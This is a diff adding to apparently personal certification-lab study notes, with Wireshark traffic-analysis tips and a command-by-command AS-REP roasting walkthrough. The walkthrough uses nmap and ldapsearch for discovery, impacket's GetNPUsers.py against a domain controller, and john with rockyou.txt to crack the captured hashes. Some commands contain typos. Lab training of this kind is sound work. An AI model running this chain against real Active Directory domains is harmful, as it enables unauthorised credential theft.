@@ -1055,6 +1055,34 @@ Password found
 - get 520125.py file and bye the FTP and check on parrot cat 520125.py and open to get vendor homepage
 more 520215.py
 or cat 
+----
+
+
+wireshark - check login method filter http.request.method == POST
+
+DDOS - udp - CHECK FOR PORT DETAILS AND SEARCH 
+
+ RPC service  - tcp.port  == 135
+Statistics - conversion -
+
+
+- open report export.txt file
+- find remote ip with higher no of packets
+The attacker IP is the Remote IP with the highest Incoming Bytes (and usually marked as Blocked).
+
+
+do as-rep roasting attack  determine the password of the vulnerable user whose credentials are obtained.
+
+sudo nmap --script smb-os-discovery -p 445 192.168.0.0/24  DOMAINM
+sudp nmap -p 88 389 -sV 192.168.0.0/24      GOT IP 
+ldapsearch -x -H ldap://192.168.0.222 -s base  DOAMIN 
+
+sudo apt install python3-impacket -y
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SKILL.CEH.COM/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
+- python3 GetNPUsers.py SKILL.com/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
+- copy the hash from output and paste in a txt file hash.txt
+- john --wordlist=rockyou.txt ~/hash.txt
+john --show hash.txt  in case you need to check out put again
 
 
 
